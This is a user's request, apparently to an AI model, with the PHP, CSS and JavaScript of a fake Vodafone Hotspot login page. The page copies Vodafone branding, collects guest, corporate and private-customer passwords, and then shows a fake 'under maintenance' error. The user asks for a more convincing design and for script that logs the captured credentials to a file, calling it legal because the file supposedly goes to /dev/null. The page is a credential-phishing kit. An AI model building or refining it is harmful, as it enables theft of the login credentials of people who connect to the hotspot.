i want the frontend UI to look more like this, and to have a js file in tabs that will log the creds to creds.txt in /dev/null to discard them (to keep it legal), as we wont  can you help with that?

<provided files:index.php;style.css;tabs.js>

index.php:

<?php
$orig = $_GET['url'] ?? '';
?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vodafone Hotspot Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
<div class="container">
  <div class="header">
    <img src="assets/vodafone-logo.png" alt="Vodafone Logo" />
    <h1>Willkommen</h1>
    <p>im Vodafone-Hotspot mit Highspeed-Internet</p>
  </div>

  <button class="accordion" id="acc-guests">
    <span>als Gast registrieren (3 Stunden Kostenlos/Tag)</span>
  </button>
  <div class="panel" id="panel-guests">
    <form id="form-guests" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="guest-email">Email</label>
        <input
                type="email"
                id="guest-email"
                name="email"
                placeholder="you@example.com"
                required
        />
        <div class="error-msg" id="guest-email-error">
          Bitte gültige E-Mail eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="guest-password">Passwort</label>
        <div class="password-wrapper">
          <input
                  type="password"
                  id="guest-password"
                  name="password"
                  placeholder="Mindestens 8 Zeichen"
                  required
          />
          <button
                  type="button"
                  class="toggle-password"
                  tabindex="-1"
                  aria-label="Passwort anzeigen/verbergen"
          >
            <svg
                    class="icon-eye"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 24 24"
                    width="24"
                    height="24"
            >
              <path
                      fill="#777"
                      d="M12 4.5c-5 0-9.27 3.11-11 7.5 1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 16.5c-2.48 0-4.5-2.02-4.5-4.5S9.52 7.5 12 7.5s4.5 2.02 4.5 4.5S14.48 16.5 12 16.5z"
              />
              <circle fill="#777" cx="12" cy="12" r="2.5"/>
            </svg>
          </button>
        </div>
        <div class="error-msg" id="guest-password-error">
          Passwort muss ≥ 8 Zeichen sein, mit Groß-/Kleinbuchstaben, Zahl & einem der Sonderzeichen „. _ - ? ! %“.
        </div>

        <ul class="password-criteria" id="guest-password-criteria">
          <li id="criteria-lowercase">
            <span class="check-icon"></span> mindestens ein Kleinbuchstabe
          </li>
          <li id="criteria-uppercase">
            <span class="check-icon"></span> mindestens ein Großbuchstabe
          </li>
          <li id="criteria-number">
            <span class="check-icon"></span> mindestens eine Zahl
          </li>
          <li id="criteria-special">
            <span class="check-icon"></span> mindestens eines der Zeichen „. _ - ? ! %“
          </li>
          <li id="criteria-length">
            <span class="check-icon"></span> 8 Zeichen Minimum
          </li>
        </ul>
      </div>

      <div class="form-group">
        <label for="guest-repeat">Passwort wiederholen</label>
        <input
                type="password"
                id="guest-repeat"
                name="repeat"
                placeholder="Passwort wiederholen"
                required
        />
        <div class="error-msg" id="guest-repeat-error">
          Passwörter stimmen nicht überein.
        </div>
      </div>

      <button type="submit">Registrieren</button>

      <div class="submit-error" id="guest-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>

  <button class="accordion" id="acc-corp">
    <span>Login zum Corporate Data Access</span>
  </button>
  <div class="panel" id="panel-corp">
    <form id="form-corp" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="corp-username">Username</label>
        <input
                type="text"
                id="corp-username"
                name="username"
                placeholder="Ihr Benutzername"
                required
        />
        <div class="error-msg" id="corp-username-error">
          Bitte Benutzernamen eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="corp-password">Portal Passwort</label>
        <input
                type="password"
                id="corp-password"
                name="password"
                placeholder="Ihr Passwort"
                required
        />
        <div class="error-msg" id="corp-password-error">
          Bitte Passwort eingeben.
        </div>
      </div>

      <button type="submit">Login</button>

      <div class="submit-error" id="corp-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>

  <button class="accordion" id="acc-private">
    <span>Privatkunden Login</span>
  </button>
  <div class="panel" id="panel-private">
    <form id="form-private" method="post" action="authenticate.php?url=<?php echo urlencode($orig); ?>">

      <div class="form-group">
        <label for="private-username">Username</label>
        <input
                type="text"
                id="private-username"
                name="username"
                placeholder="Ihr Benutzername"
                required
        />
        <div class="error-msg" id="private-username-error">
          Bitte Benutzernamen eingeben.
        </div>
      </div>

      <div class="form-group">
        <label for="private-password">Ihr Internet-Passwort</label>
        <input
                type="password"
                id="private-password"
                name="password"
                placeholder="Ihr Internet-Passwort"
                required
        />
        <div class="error-msg" id="private-password-error">
          Bitte Passwort eingeben.
        </div>
      </div>

      <button type="submit">Login</button>

      <div class="submit-error" id="private-submit-error">
        Login failed code 400, Hotspot currently under maintenance.
      </div>
    </form>
  </div>
</div>

<script src="tabs.js"></script>
</body>
</html>

style.css:

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f7f7f7;
    color: #333;
    display: flex;
    flex-direction: column;
    align-items: center;
    min-height: 100vh;
    padding-top: 40px;
    padding-bottom: 40px; 
}


.container {
    width: 100%;
    max-width: 500px;       
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    overflow: hidden;
    margin-bottom: 24px;
}

.header {
    text-align: center;
    padding: 24px 16px;
    border-bottom: 1px solid #e0e0e0;
}

.header img {
    max-width: 120px; 
    height: auto;
    margin-bottom: 12px;
}

.header h1 {
    font-size: 24px;
    margin-bottom: 4px;
    color: #e60000; 
}

.header p {
    font-size: 14px;
    color: #555;
}


.accordion {
    background-color: #f1f1f1;
    color: #333;
    cursor: pointer;
    padding: 16px 20px;
    width: 100%;
    border: none;
    outline: none;
    text-align: left;
    font-size: 16px;
    font-weight: 600;
    display: flex;
    justify-content: space-between;
    align-items: center;
    transition: background-color 0.2s ease;
    border-bottom: 1px solid #ddd;
}

.accordion:hover {
    background-color: #eaeaea;
}


.accordion:after {
    content: '\25BE';
    font-size: 12px;
    transition: transform 0.2s ease;
    color: #777;
}

.accordion.active:after {
    transform: rotate(180deg);
}


.panel {
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.3s ease-out;
    background-color: #fafafa;
    border-bottom: 1px solid #ddd;
    padding: 0 20px;
}

.panel.open {
    padding-top: 16px;
    padding-bottom: 20px;
}


.panel form {
    display: flex;
    flex-direction: column;
}

.panel .form-group {
    margin-bottom: 16px;
    position: relative;
}

.panel label {
    font-size: 14px;
    margin-bottom: 6px;
    display: block;
    color: #333;
}

.panel input {
    width: 100%;
    padding: 10px 12px;
    font-size: 14px;
    border: 1px solid #ccc;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s ease;
}

.panel input:focus {
    border-color: #e60000; 
    box-shadow: 0 0 0 2px rgba(230, 0, 0, 0.1);
}

.panel .error-msg {
    position: absolute;
    bottom: -18px;
    left: 0;
    font-size: 12px;
    color: #c00;
    display: none;
}

.panel .error-msg.active {
    display: block;
}

.panel button {
    margin-top: 6px;
    padding: 12px;
    background-color: #e60000;
    color: #fff;
    font-size: 16px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: background-color 0.2s ease;
}

.panel button:hover {
    background-color: #cc0000;
}


.submit-error {
    background-color: #ffe5e5;
    border: 1px solid #f5c2c2;
    color: #a00;
    padding: 12px 16px;
    margin-top: 12px;
    border-radius: 4px;
    font-size: 14px;
    text-align: center;
    display: none;
}

.submit-error.active {
    display: block;
}


@media (max-width: 480px) {
    .header h1 {
        font-size: 20px;
    }
    .accordion {
        font-size: 14px;
        padding: 14px 16px;
    }
    .panel input {
        font-size: 13px;
    }
    .panel button {
        font-size: 15px;
    }
}

.password-wrapper {
    position: relative;
    display: flex;
    align-items: center;
}


.password-wrapper input[type="password"] {
    width: 100%;
    padding-right: 40px; 
}


.password-wrapper .toggle-password {
    position: absolute;
    right: 10px;
    background: transparent;
    border: none;
    cursor: pointer;
    font-size: 18px;
    line-height: 1;
    padding: 4px;
    color: #777;
}


.password-wrapper .toggle-password:hover {
    color: #333;
}


.password-criteria {
    list-style: none;
    margin: 12px 0 0 0;
    padding: 0 20px; 
}

.password-criteria li {
    font-size: 13px;
    color: #b30000;
    margin-bottom: 6px;
    display: flex;
    align-items: center;
}


.password-criteria .check-icon {
    display: inline-block;
    width: 20px;    
    font-size: 16px;
    margin-right: 6px;
    color: #b30c0c;    
}


.password-criteria li.valid .check-icon {
    color: #0a0;    
}


.password-criteria li.valid {
    color: #0a0;
}



#error-margin-fix {
    margin-top: 0; 
}


@media (max-width: 480px) {
    
    .password-criteria {
        padding: 0 10px;
        font-size: 12px;
    }
}



.password-wrapper .toggle-password {
    position: absolute;
    right: 10px;
    background: transparent;
    border: none;
    cursor: pointer;
    padding: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
    outline: none;
}


.password-wrapper .toggle-password:hover .icon-eye,
.password-wrapper .toggle-password:hover .icon-eye-slash {
    fill: #333; 
}


.password-wrapper .toggle-password .icon-eye,
.password-wrapper .toggle-password .icon-eye-slash {
    width: 20px;
    height: 20px;
    fill: #777;       
    transition: fill 0.15s ease;
}


.password-wrapper .toggle-password.showing-password .icon-eye {
    display: none;
}
.password-wrapper .toggle-password.showing-password .icon-eye-slash {
    display: block;
}


#criteria-allowed-chars.valid .check-icon {
    color: #0a0; 
}
#criteria-allowed-chars.valid {
    color: #0a0; 
}

tabs.js(current):

document.querySelectorAll('.accordion').forEach((button) => {
    button.addEventListener('click', () => {
        button.classList.toggle('active');

        const panel = button.nextElementSibling;
        if (button.classList.contains('active')) {
            panel.classList.add('open');
            panel.style.maxHeight = panel.scrollHeight + 'px';
        } else {
            panel.classList.remove('open');
            panel.style.maxHeight = null;
        }
    });
});

function showError(element, message) {
    element.textContent = message;
    element.classList.add('active');
}
function hideError(element) {
    element.textContent = '';
    element.classList.remove('active');
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}
function validatePasswordComplexity(pw) {
    return (
        /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[^\w\s]).{8,}$/.test(pw) &&
        pw[0] !== ' ' &&
        pw[pw.length - 1] !== ' '
    );
}


const pwInput = document.getElementById('guest-password');
const criteriaLower = document.getElementById('criteria-lowercase');
const criteriaUpper = document.getElementById('criteria-uppercase');
const criteriaNumber = document.getElementById('criteria-number');
const criteriaSpecial = document.getElementById('criteria-special');
const criteriaLength = document.getElementById('criteria-length');

function updatePasswordCriteria() {
    const pw = pwInput.value;

    if (/[a-z]/.test(pw)) {
        criteriaLower.classList.add('valid');
    } else {
        criteriaLower.classList.remove('valid');
    }

    if (/[A-Z]/.test(pw)) {
        criteriaUpper.classList.add('valid');
    } else {
        criteriaUpper.classList.remove('valid');
    }

    if (/\d/.test(pw)) {
        criteriaNumber.classList.add('valid');
    } else {
        criteriaNumber.classList.remove('valid');
    }

    if (/[^\w\s]/.test(pw)) {
        criteriaSpecial.classList.add('valid');
    } else {
        criteriaSpecial.classList.remove('valid');
    }

    if (pw.length >= 8) {
        criteriaLength.classList.add('valid');
    } else {
        criteriaLength.classList.remove('valid');
    }
}

pwInput.addEventListener('input', updatePasswordCriteria);

const eyeBtn = document.querySelector('.toggle-password');
const pwInputUpdated = document.getElementById('guest-password');

eyeBtn.addEventListener('click', function () {
    if (pwInputUpdated.type === 'password') {
        pwInputUpdated.type = 'text';
        eyeBtn.classList.add('showing-password');
    } else {
        pwInputUpdated.type = 'password';
        eyeBtn.classList.remove('showing-password');
    }
});


document.getElementById('form-guests').addEventListener('submit', function (e) {
    e.preventDefault(); 

    const emailInput = document.getElementById('guest-email');
    const emailError = document.getElementById('guest-email-error');

    const pwInput = document.getElementById('guest-password');
    const pwError = document.getElementById('guest-password-error');

    const repeatInput = document.getElementById('guest-repeat');
    const repeatError = document.getElementById('guest-repeat-error');

    let valid = true;
  
    if (!validateEmail(emailInput.value.trim())) {
        showError(emailError, 'Bitte gültige E-Mail eingeben.');
        valid = false;
    } else {
        hideError(emailError);
    }

    if (!validatePasswordComplexity(pwInput.value)) {
        showError(
            pwError,
            'Passwort muss ≥ 8 Zeichen sein, mit Groß-/Kleinbuchstaben, Zahl & Sonderzeichen.'
        );
        valid = false;
    } else {
        hideError(pwError);
    }

    if (pwInput.value !== repeatInput.value || repeatInput.value === '') {
        showError(repeatError, 'Passwörter stimmen nicht überein.');
        valid = false;
    } else {
        hideError(repeatError);
    }

    if (valid) {
        e.target.submit();
    }
});

document.getElementById('form-corp').addEventListener('submit', function (e) {
    e.preventDefault();

    const userInput = document.getElementById('corp-username');
    const userError = document.getElementById('corp-username-error');

    const passInput = document.getElementById('corp-password');
    const passError = document.getElementById('corp-password-error');

    let valid = true;

    if (userInput.value.trim() === '') {
        showError(userError, 'Bitte Benutzernamen eingeben.');
        valid = false;
    } else {
        hideError(userError);
    }

    if (passInput.value.trim() === '') {
        showError(passError, 'Bitte Passwort eingeben.');
        valid = false;
    } else {
        hideError(passError);
    }

    if (valid) {
        e.target.submit();
    }
});

document.getElementById('form-private').addEventListener('submit', function (e) {
    e.preventDefault();

    const userInput = document.getElementById('private-username');
    const userError = document.getElementById('private-username-error');

    const passInput = document.getElementById('private-password');
    const passError = document.getElementById('private-password-error');

    let valid = true;

    if (userInput.value.trim() === '') {
        showError(userError, 'Bitte Benutzernamen eingeben.');
        valid = false;
    } else {
        hideError(userError);
    }

    if (passInput.value.trim() === '') {
        showError(passError, 'Bitte Passwort eingeben.');
        valid = false;
    } else {
        hideError(passError);
    }

    if (valid) {
        e.target.submit();
    }
});
